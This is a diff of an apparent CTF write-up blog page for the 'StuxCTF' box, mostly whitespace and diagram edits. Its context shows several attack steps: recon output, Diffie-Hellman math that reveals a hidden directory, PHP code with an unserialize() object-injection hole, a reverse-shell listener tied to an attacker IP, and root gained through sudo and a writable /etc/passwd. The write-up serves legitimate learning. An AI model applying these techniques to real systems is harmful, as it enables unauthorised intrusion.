@@ -107,9 +107,9 @@
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-n</span> <span class="nt">-p</span> 22,80 &lt;TARGET_IP&gt; <span class="nt">-oN</span> nmap.txt
 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open http Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
 </code></pre></div></div>
 
 <p>Just SSH and a web server. <code class="language-plaintext highlighter-rouge">robots.txt</code> is the first thing worth checking:</p>
@@ -141,17 +141,17 @@ Disallow: /StuxCTF/
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;TARGET_IP&gt;
 
 &lt;html&gt;
-    &lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Default Page&lt;/title&gt;&lt;/head&gt;
-    &lt;body&gt;
-        &lt;<span class="o">!</span><span class="nt">--</span> The secret directory is...
-        p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251<span class="p">;</span>
-        g: 7<span class="p">;</span>
-        a: 330<span class="p">;</span>
-        b: 450<span class="p">;</span>
-        g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617<span class="p">;</span>
-        <span class="nt">--</span><span class="o">&gt;</span>
-        is blank....
-    &lt;/body&gt;
+ &lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Default Page&lt;/title&gt;&lt;/head&gt;
+ &lt;body&gt;
+ &lt;<span class="o">!</span><span class="nt">--</span> The secret directory is...
+ p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251<span class="p">;</span>
+ g: 7<span class="p">;</span>
+ a: 330<span class="p">;</span>
+ b: 450<span class="p">;</span>
+ g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617<span class="p">;</span>
+ <span class="nt">--</span><span class="o">&gt;</span>
+ is blank....
+ &lt;/body&gt;
 &lt;/html&gt;
 </code></pre></div></div>
 
@@ -159,7 +159,7 @@ Disallow: /StuxCTF/
 
 <p>The scheme here is 3-party, not the textbook 2-party version — Alice, Bob, and Carol. <code class="language-plaintext highlighter-rouge">a</code> and <code class="language-plaintext highlighter-rouge">b</code> are Alice’s and Bob’s private keys, leaked in plaintext. <code class="language-plaintext highlighter-rouge">g^c</code> is Carol’s public key, which is supposed to be public anyway. With two of the three private exponents already in hand, there’s no discrete log to solve — I just raise Carol’s public value to the product of the two leaked private keys:</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shared_secret</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">gc</span><span class="p">,</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>   <span class="c1"># = g^(a*b*c) mod p
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shared_secret</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">gc</span><span class="p">,</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="c1"># = g^(a*b*c) mod p
 </span><span class="n">directory_name</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">shared_secret</span><span class="p">)[:</span><span class="mi">128</span><span class="p">]</span>
 </code></pre></div></div>
 
@@ -188,22 +188,22 @@ python3 <span class="nt">-c</span> <span class="s2">"..."</span>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="kd">class</span> <span class="nc">file</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s2">"dump.txt"</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"dump test"</span><span class="p">;</span>
-    <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
-        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
-    <span class="p">}</span>
+ <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s2">"dump.txt"</span><span class="p">;</span>
+ <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"dump test"</span><span class="p">;</span>
+ <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+ <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+ <span class="p">}</span>
 <span class="p">}</span>
 
 <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
 <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)){</span>
-    <span class="k">echo</span> <span class="s2">"File no Exist!"</span><span class="p">;</span>
+ <span class="k">echo</span> <span class="s2">"File no Exist!"</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="k">if</span><span class="p">(</span><span class="nv">$file_name</span><span class="o">==</span><span class="s2">"index.php"</span><span class="p">){</span>
-    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span>
-    <span class="nv">$tags</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="s2">""</span><span class="p">);</span>
-    <span class="k">echo</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$tags</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)))));</span>
+ <span class="nv">$content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span>
+ <span class="nv">$tags</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="s2">""</span><span class="p">);</span>
+ <span class="k">echo</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$tags</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)))));</span>
 <span class="p">}</span>
 <span class="nb">unserialize</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">));</span>
 </code></pre></div></div>
@@ -267,7 +267,7 @@ connect to <span class="o">[</span>&lt;ATTACKER_IP&gt;] from <span class="o">(</
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
 
 User www-data may run the following commands on ubuntu:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+ <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
 </code></pre></div></div>
 
 <p>That’s root, directly:</p>
@@ -282,7 +282,7 @@ User www-data may run the following commands on ubuntu:
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /etc/passwd
 
-<span class="nt">-rwxrwxrwx</span> 1 root root 1465 Aug  8  2019 /etc/passwd
+<span class="nt">-rwxrwxrwx</span> 1 root root 1465 Aug 8 2019 /etc/passwd
 </code></pre></div></div>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> xyz test123
@@ -305,17 +305,28 @@ su hacker
 
 <div class="mermaid">
 graph TD
-    A["Nmap scan<br />SSH and HTTP only"] --&gt; B["robots.txt<br />Diffie-Hellman hint"]
-    B --&gt; C["Homepage HTML comment<br />leaked DH parameters"]
-    C --&gt; D["3-party DH math<br />pow(gc, a*b, p)"]
-    D --&gt; E["Hidden directory<br />confirmed 200 OK"]
-    E --&gt; F["index.php source leaked<br />hex/reverse/base64"]
-    F --&gt; G["unserialize on file_get_contents<br />PHP Object Injection"]
-    G --&gt; H["Serialized payload<br />writes shell.php"]
-    H --&gt; I["RCE confirmed<br />www-data"]
-    I --&gt; J["Reverse shell<br />mkfifo plus nc"]
-    J --&gt; K["sudo -l<br />NOPASSWD ALL"]
-    K --&gt; L["Root via sudo su"]
+ subgraph RECON["RECON"]
+  A["Nmap scan SSH HTTP"]
+ end
+ 
+ subgraph ENUM["ENUMERATION"]
+  B["robots.txt Diffie-Hellman hint"] --&gt; C["DH parameters descubiertos"]
+  D["index.php source leaked"] --&gt; E["PHP Object Injection vulnerability"]
+ end
+ 
+ subgraph EXPL["EXPLOITATION"]
+  F["Serialized payload creado"] --&gt; G["shell.php escrito RCE"]
+  G --&gt; H["Reverse shell mkfifo nc"]
+ end
+ 
+ subgraph PRIVESC["PRIVESC"]
+  I["sudo -l NOPASSWD ALL"] --&gt; J["Root via sudo su"]
+ end
+ 
+ A --&gt; B
+ C --&gt; D
+ E --&gt; F
+ H --&gt; I
 </div>
 
 <hr />
@@ -327,6 +338,23 @@ graph TD
 <p><strong>Silent failures in serialization are a shell-quoting problem in disguise</strong> — a declared string length mismatch of just two characters, caused by escaping quotes that didn’t need escaping, was enough to make <code class="language-plaintext highlighter-rouge">unserialize()</code> fail with no error at all.</p>
 
 <p><strong>Multiple delivery mechanisms can reach the same vulnerable sink</strong> — <code class="language-plaintext highlighter-rouge">php://input</code> and a self-hosted file over RFI both end up calling <code class="language-plaintext highlighter-rouge">file_get_contents()</code> on attacker-controlled input; the vulnerability is in what happens to that data afterward, not in how it arrives.</p>
+
+
+  <script src="https://giscus.app/client.js"
+        data-repo="renekerr/renekerr.github.io"
+        data-repo-id="R_kgDOS3a2UA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOS3a2UM4DCBOG"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
 
 </div>
 
@@ -342,27 +370,27 @@ graph TD
     
       <li>
         <h3>
-          <a href="/ctf/web/2026/07/10/blog/">
-            Blog
-            <small>10 Jul 2026</small>
+          <a href="/ctf/puzzle/steganography/web/privesc/2026/08/19/biohazard-ctf/">
+            Biohazard CTF: Unraveling a Resident Evil Puzzle Box
+            <small>19 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/ctf/2026/07/08/watcher/">
-            Watcher
-            <small>08 Jul 2026</small>
+          <a href="/ctf/web/privesc/joomla/2026/08/16/joker-ctf/">
+            Joker CTF
+            <small>16 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/websec/2026/07/07/username-enumeration-timing/">
-            Username Enumeration via Response Timing
-            <small>07 Jul 2026</small>
+          <a href="/ctf/web/privesc/2026/08/09/boilerctf/">
+            BoilerCTF
+            <small>09 Aug 2026</small>
           </a>
         </h3>
       </li>
